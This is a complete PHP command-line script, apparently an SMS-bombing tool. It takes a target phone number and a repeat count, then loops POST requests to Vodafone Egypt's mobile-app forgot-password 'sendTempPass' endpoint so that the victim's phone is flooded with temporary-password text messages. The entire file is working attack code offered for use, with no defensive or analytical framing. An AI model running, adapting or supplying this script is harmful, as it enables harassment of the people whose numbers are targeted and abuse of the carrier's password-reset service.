<?php

$phone = readline('Phone number (e.g. 01038499937): ');
$looping_number = readline('Looping number (e.g. 50): ');

class Vodafone
{
	private $phone;
	private $looping_number;

	function __construct($phone, $looping_number)
	{
		$this->phone = $phone;
		$this->looping_number = $looping_number;
	}

	private function sms()
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://mobile.vodafone.com.eg/mobile-app/userProfile/forgotPassword/sendTempPass?msisdn=' . $this->phone);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch);
		curl_close($ch);
	}

	public function spammer()
	{
		for ($i = 1; $i <= $this->looping_number; $i++) {
			$this->sms();
			echo "[" . $i . "] Spamming...\n";
		}
	}
}

$sms = new Vodafone($phone, $looping_number);
$sms->spammer();
